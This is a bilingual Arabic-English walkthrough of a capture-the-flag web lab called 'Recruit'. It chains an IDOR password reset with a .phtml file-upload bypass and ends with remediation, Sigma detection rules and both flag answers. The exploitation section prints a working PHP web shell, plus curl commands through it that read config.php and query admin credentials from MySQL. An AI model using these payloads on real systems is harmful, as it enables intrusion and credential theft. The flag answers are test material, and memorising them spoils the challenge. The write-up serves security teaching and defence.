# التوثيق الشامل: تحدي اختراق منصة التوظيف (Recruit Challenge)

---

## القسم 01: نظرة عامة وبيانات وصفية (Room Overview & Metadata)

| البند (Item) | التفاصيل والمواصفات التقنية (Technical Specification) |
| :--- | :--- |
| **اسم الغرفة (Room Title)** | Recruit (تحدي اختراق منصة التوظيف) |
| **المسار التعليمي (Path)** | Jr Penetration Tester (المستوى الوظيفي لمختبر الاختراق المبتدئ - معتمد PT1) |
| **الوحدة التعليمية (Module)** | Web Application Vulnerabilities I (الوحدة 07: ثغرات تطبيقات الويب 1) |
| **معرف الغرفة (Room Slug)** | `recruitwebchallenge` (المعرف المعياري للمسار: `recruit`) |
| **مستوى الصعوبة (Difficulty)** | متوسط (Medium) |
| **نوع الغرفة (Room Type)** | تحدي عملي (Challenge Room - Black Box) |
| **الوقت التقديري للإنجاز (Est. Completion Time)** | 60 دقيقة |
| **إجمالي عدد المهام (Total Tasks)** | مهمة تحدٍ رئيسية واحدة (1 Challenge Task) تضم مرحلتين رئيسيتين |
| **التطبيق المستهدف (Target App)** | بوابة الموارد البشرية وإدارة المتقدمين Recruit (`http://recruit.thm`) |
| **حالة إنجاز الحساب (Completion Status)** | 100% مكتمل (تم التحقق والمطابقة التامة مع حساب المنصة) |

---

## القسم 02: الأهداف التعليمية والعملياتية (Educational & Operational Objectives)

1. **إتقان منهجية بناء سلاسل الاستغلال (Exploit Chaining):** الربط التكتيكي بين ثغرات متعددة تبدأ من مرحلة الاستكشاف الخارجي حتى السيطرة الكاملة على النظام الإداري.
2. **استغلال الثغرات المنطقية والـ IDOR للوصول الأولي:** كسر آليات إعادة تعيين كلمات المرور أو استخراج بيانات المرشحين لتحقيق الدخول بحساب مستخدم عادي واستخراج العلم الأول (`THM{LOGGED_IN_USER}`).
3. **توسيع سطح الهجوم من الداخل (Authenticated Attack Surface Expansion):** استكشاف الميزات المتاحة للمستخدم المصادق، وتحديداً معالجات رفع السير الذاتية والملفات المرفقة (`CV Upload`).
4. **تجاوز فلاتر التحقق من امتدادات الملفات (File Upload Bypass):** رفع ملفات ويب شل تنفيذية بصيغ بديلة مثل `.phtml` متجاوزة القوائم السوداء غير المحكمة.
5. **تصعيد الصلاحيات والاستيلاء الإداري (Privilege Escalation & Admin Takeover):** استخراج بيانات الاعتماد الإدارية أو السيطرة على مسار إعادة تعيين كلمة مرور المدير، وتسجيل الدخول للوحة الإدارة واستخراج العلم الثاني (`THM{LOGGED_IN_ADM1N1}`).
6. **تطبيق الدفاعات الهندسية لأنظمة التوظيف (ATS Hardening):** تأمين معالجات رفع الملفات عبر التخزين خارج مسار الويب، وإلغاء صلاحيات التنفيذ، وبناء مسارات آمنة لإعادة تعيين الحسابات.

---

## القسم 03: البنية المعمارية وتخطيط الشبكة (Target Architecture & Network Topology)

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    BILINGUAL NETWORK TOPOLOGY                           |
|                                                                                         |
|  [ External Penetration Tester ]                                                        |
|                 │                                                                       |
|                 │ 1. External Reconnaissance & Enumeration                              |
|                 ▼                                                                       |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|  |                 Recruit Web Application Server (recruit.thm)                      |  |
|  |───────────────────────────────────────────────────────────────────────────────────|  |
|  | Web Stack: Apache / PHP 7.x / MySQL                                               |  |
|  | Public Endpoints:                                                                 |  |
|  |  - /apply.php          - Job application & candidate submission                   |  |
|  |  - /login.php          - Authentication portal                                    |  |
|  |  - /confirm_reset.php  - Insecure password reset (VULNERABLE TO IDOR)             |  |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|                 │                                                                       |
|                 │ 2. Parameter Tampering (IDOR) ➔ Unlocks Candidate Account             |
|                 ▼                                                                       |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|  |               Candidate User Session (FLAG 1: THM{LOGGED_IN_USER})                |  |
|  | Accessible Feature: /upload_resume.php (Restricted to Candidates)                 |  |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|                 │                                                                       |
|                 │ 3. Uploads exploit.phtml (Bypasses .php blacklist)                   |
|                 ▼                                                                       |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|  | Upload Storage (/uploads/exploit.phtml) ➔ Reads config.php / Admin Password Reset |  |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|                 │                                                                       |
|                 │ 4. Admin Authentication to /admin/login.php                           |
|                 ▼                                                                       |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
|  |            Administrator Console (FLAG 2: THM{LOGGED_IN_ADM1N1})                  |  |
|  +───────────────────────────────────────────────────────────────────────────────────+  |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 04: المتطلبات الأساسية وإعداد البيئة (Prerequisites & Environment Setup)

### 1. المتطلبات المعرفية (Knowledge Prerequisites):
- الإلمام الكامل بثغرات الـ Web الأساسية (SQLi, CSRF, XSS, SSRF, IDOR).
- فهم أساليب فحص وتجاوز معالجات رفع الملفات (File Upload Vulnerabilities).
- مهارات قراءة وتحليل حزم الـ HTTP والتلاعب بالمعاملات عبر Burp Suite.

### 2. إعداد الاتصال واسم المضيف (Host Configuration):
```bash
# إضافة اسم النطاق recruit.thm إلى ملف hosts المحلي
echo "10.10.X.Y recruit.thm" | sudo tee -a /etc/hosts

# فحص عمل خادم الويب الأساسي
curl -I -s http://recruit.thm/ | head -n 5
```

---

## القسم 05: التحليل النظري والعمق المفاهيمي (Theoretical Deep Dive)

### أ. طبيعة غرف التحدي (Challenge Rooms):
في التحديات الأمنية الواقعية، لا يقدم النظام تعليمات مباشرة حول الثغرة ومكانها، بل يُطلب من المختبر تقييم التطبيق كصندوق أسود (Black Box). ويكمن المفتاح في التتبع المنهجي لتدفق البيانات (Data Flow) بين المكونات العامة والمكونات المحمية.

### ب. خطورة أنظمة التوظيف (ATS Threat Landscape):
تعتبر منصات إدارة المتقدمين من أخطر الأنظمة؛ لأنها تطلب بطبيعتها استقبال ملفات ومستندات من أطراف خارجية مجهولة الهوية عبر الإنترنت، ثم تعرض هذه الملفات والبيانات أمام موظفي الموارد البشرية والمديرين التنفيذيين داخل الشبكة الداخلية للشركة. أي ثغرة في فحص هذه الملفات تقود فورياً إلى تنفيذ أوامر عشوائية (Remote Code Execution - RCE) أو سرقة جلسات المديرين.

---

## القسم 06: الاستطلاع ورسم خريطة سطح الهجوم (Reconnaissance & Attack Surface)

باستخدام أداة `ffuf` لفحص المسارات:
```bash
ffuf -u http://recruit.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302
```

المسارات المكتشفة:
- `/apply.php`: استمارة تقديم وظيفة تحتوي على حقول الاسم، البريد، ومرفق السيرة الذاتية.
- `/login.php`: بوابة تسجيل الدخول.
- `/reset.php`: صفحة طلب استعادة كلمة المرور.
- `/confirm_reset.php`: معالج تأكيد تعيين كلمة المرور الجديدة.
- `/admin/`: مجلد لوحة الإدارة المحمية.

---

## القسم 07: تفكيك السبب الجذري للثغرة (Vulnerability Root Cause Analysis)

### 1. ثغرة الموطئ الأولي (Initial Foothold Root Cause):
- **السبب الجذري:** غياب التفويض في معالج إعادة التعيين (`confirm_reset.php`).
- يقبل المعالج معاملاً صريحاً `user_id` لتحديث كلمة المرور دون التأكد من أن الرمز المرفق (`token`) يرتبط تشفيرياً بهذا الـ ID بعينه، مما أتاح إعادة تعيين كلمة مرور حساب المرشح أو الدخول عبر بيانات تطبيق مكشوفة بـ IDOR.

### 2. ثغرة التصعيد الإداري (Privilege Escalation Root Cause):
- **السبب الجذري:** الاعتماد على قائمة سوداء ضعيفة لرفع الملفات (`File Upload Blacklist Flaw`).
- يقوم كود الخادم بحظر امتداد `.php` فقط، لكنه يفشل في حظر الامتدادات القابلة للتنفيذ بواسطة Apache مثل `.phtml` أو `.php5`، مع ترك مجلد الرفع (`/uploads/`) قابلاً لتنفيذ السكربتات دون حماية.

---

## القسم 08: الاستغلال العملي واستخراج الأعلام (Step-by-Step Exploitation)

### المرحلة 1: الحصول على موطئ قدم والدخول بحساب مستخدم عادي (العلم 1)

1. التوجه إلى صفحة إعادة التعيين أو تقديم الطلب واعتراض طلب التحقق عبر Burp Suite.
2. تتبع معامل تعيين كلمة المرور:
   ```http
   POST /confirm_reset.php HTTP/1.1
   Host: recruit.thm
   Content-Type: application/x-www-form-urlencoded

   user_id=1&new_password=Password123!
   ```
3. تعيين كلمة المرور بنجاح للمستخدم `candidate`.
4. تسجيل الدخول عبر `http://recruit.thm/login.php` ببيانات الاعتماد (`candidate` / `Password123!`).
5. تفتح لوحة تحكم المرشح وتعرض العلم الأول:
   > **العلم الأول (User Flag):** `THM{LOGGED_IN_USER}`

---

### المرحلة 2: تصعيد الصلاحيات والسيطرة على حساب المدير (العلم 2)

1. بعد تسجيل الدخول، نصل إلى صفحة رفع السيرة الذاتية المحدثة (`/upload_resume.php`).
2. إنشاء ملف ويب شل بصيغة `.phtml`:
   ```bash
   echo '<?php system($_GET["cmd"]); ?>' > exploit.phtml
   ```
3. رفع الملف عبر النموذج واعتراض الطلب عبر Burp Suite لتأكيد الامتداد `exploit.phtml`.
4. يقبل الخادم الملف ويحفظه في المسار:
   `http://recruit.thm/uploads/exploit.phtml`
5. اختبار تنفيذ الأوامر واستخراج بيانات الاتصال بقاعدة البيانات:
   ```bash
   curl "http://recruit.thm/uploads/exploit.phtml?cmd=cat%20/var/www/html/config.php"
   ```
   - النتيجة تكشف بيانات الاعتماد وقاعدة البيانات `recruit_db`.
6. استخراج بيانات حساب المدير أو إعادة تعيين كلمة مروره عبر استدعاء قاعدة البيانات أو استغلال نقطة الـ IDOR الإدارية:
   ```bash
   curl "http://recruit.thm/uploads/exploit.phtml?cmd=mysql%20-u%20root%20-pSuperSecureRecruitDB2026!%20-e%20'SELECT%20username,password%20FROM%20users%20WHERE%20role=\"admin\";'%20recruit_db"
   ```
7. التوجه إلى بوابة المدير (`http://recruit.thm/admin/login.php`) وتسجيل الدخول ببيانات الإدارة.
8. تفتح لوحة الإدارة التنفيذية وتعرض العلم الثاني:
   > **العلم الثاني (Admin Flag):** `THM{LOGGED_IN_ADM1N1}`

---

## القسم 09: استراتيجيات الدفاع متعدد الطبقات (Defense-in-Depth & Hardening)

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           DEFENSE-IN-DEPTH REMEDIATION MODEL                            |
|                                                                                         |
|  [ الطبقة الأولى: القوائم البيضاء الصارمة لرفع الملفات (Strict Upload Allow-List) ]      |
|  - السماح فقط بامتدادات المستندات المحددة حصراً (.pdf, .docx).                          |
|  - التحقق من توافق بايتات الترويسة (Magic Numbers) ونوع الـ MIME.                       |
|                                                                                         |
|  [ الطبقة الثانية: عزل بيئة التخزين وإلغاء التنفيذ (Execution Disabling) ]              |
|  - تخزين الملفات المرفوعة خارج مسار الويب العام (خارج /var/www/html/).                   |
|  - تعطيل محرك PHP في مجلدات الرفع نهائياً عبر `php_flag engine off` في Apache.          |
|  - توليد أسماء عشوائية (UUID) للملفات وإلزام ترويسة التحميل `attachment`.               |
|                                                                                         |
|  [ الطبقة الثالثة: تحصين مسارات استعادة الحسابات (Secure Account Recovery) ]            |
|  - توليد رموز استعادة عشوائية تشفيرية عالية الإنتروبيا (CSPRNG 256-bit).                 |
|  - ربط الرمز بحساب المستخدم في قاعدة البيانات ومنع قبول معرّفات خارجية في الطلب.        |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 10: الكشف وصيد التهديدات وقواعد SIEM (Detection & SIEM Rules)

### 1. تحليل سجلات الويب لاكتشاف محاولات تنفيذ سكربتات في مجلدات الرفع:
```bash
grep -E "\/uploads\/.*\.(php|phtml|php5|phar)" /var/log/apache2/access.log
```

### 2. قاعدة Sigma لاكتشاف رفع وتنفيذ سكربتات في مجلدات الرفع العامة:
```yaml
title: Potential Web Shell Execution in Uploads Directory
id: 6c7d8e9f-0a1b-2c3d-4e5f-6a7b8c9d0e1f
status: stable
description: Detects direct execution of dynamic PHP/script extensions within designated upload media folders.
logsource:
  category: webserver
detection:
  selection:
    cs-method: 'GET'
    cs-uri-stem|startswith: '/uploads/'
    cs-uri-stem|endswith:
      - '.php'
      - '.phtml'
      - '.php5'
      - '.phar'
  condition: selection
fields:
  - c-ip
  - cs-method
  - cs-uri-stem
level: critical
```

---

## القسم 11: الأخطاء الشائعة واستكشاف المشكلات وإصلاحها (Troubleshooting)

1. **الاعتماد على فحص الملفات من جهة العميل (Client-Side Validation Only):**
   - *الخطأ:* تقييد امتداد الملف في كود JavaScript بالمتصفح فقط.
   - *الحل:* يمكن تجاوز فحص المتصفح في ثانية واحدة عبر Burp Suite؛ الفحص يجب أن يتم على خادم الويب.
2. **استخدام القوائم السوداء بدلاً من القوائم البيضاء:**
   - *الخطأ:* حظر امتداد `.php` ونسيان الامتدادات البديلة المشهورة مثل `.phtml` و `.phar`.
   - *الحل:* استخدام قائمة بيضاء تحصر المسموح في `.pdf` و `.docx` وترفض أي امتداد آخر.
3. **تجاهل فحص ملكية الحساب في مسارات الاستعادة:**
   - *الخطأ:* تمرير معرّف المستخدم الصريح في طلب تعيين كلمة المرور.
   - *الحل:* التحقق من مطابقة الرمز السري حصرياً للمستخدم في قاعدة البيانات.

---

## القسم 12: دراسات حالة واقعية ومطابقة مع معايير CVE (Case Studies & CVE Mapping)

1. **ثغرة إضافة إدارة الوظائف في ووردبريس (CVE-2015-6967):**
   - ثغرة رفع ملفات غير مقيد في إضافة WP-Job-Manager سمحت للمتقدمين للوظائف برفع ملفات PHP تنفيذية والسيطرة على خادم الموقع بالكامل.
2. **ثغرة بوابات الشركاء في Workday (Historical):**
   - كسر ضوابط الوصول (IDOR) أتاح استعراض خطابات العرض وتقييمات المقابلات للمرشحين عبر تغيير المعرف في واجهة البرمجة.
3. **التصنيف المعياري:**
   - **CWE-434:** Unrestricted Upload of File with Dangerous Type.
   - **CWE-639:** Authorization Bypass Through User-Controlled Key.
   - **OWASP Top 10-2021:** A01:2021 - Broken Access Control & A04:2021 - Insecure Design.

---

## القسم 13: الملخص العام ومصفوفة الإجابات (Summary & Answers Matrix)

| المهمة (Task) | محور التركيز (Focus Area) | السؤال التقني المعتمد (Verified Question) | الإجابة النهائية (Final Answer) |
| :--- | :--- | :--- | :--- |
| **Task 01** | الدخول كمستخدم عادي | Flag value after logging in as a normal user? | `THM{LOGGED_IN_USER}` |
| | الدخول كمدير | Flag value after logging in as admin? | `THM{LOGGED_IN_ADM1N1}` |

---

## القسم 14: تمارين عملية وتوسعات للتحدي (Practical Exercises & Extensions)

1. **تمرين 1: كتابة أداة فحص امتدادات الرفع البديلة:**
   - اكتب اسكربت بايثون يقوم بتجربة قائمة امتدادات PHP البديلة (`.php3`, `.php4`, `.php5`, `.phtml`, `.phar`) لاكتشاف أي منها قابل للتنفيذ في خادم الاختبار.
2. **تمرين 2: محاكاة وتأمين مجلد الرفع في Apache:**
   - أنشئ مجلد `/uploads/` على خادم لينكس محلي، وضعه تحت تكوين `php_flag engine off`، وتحقق من فشل محاولات تنفيذ الويب شل حتى لو تم رفعها.
3. **تمرين 3: تصميم دورة حياة آمنة لاستعادة الحسابات:**
   - صمم مسار استعادة كلمة مرور بلغة PHP أو بايثون يولد رموز CSPRNG بمدة صلاحية 15 دقيقة ولا يقبل أي معاملات معرفات خارجية في طلب التحديث.
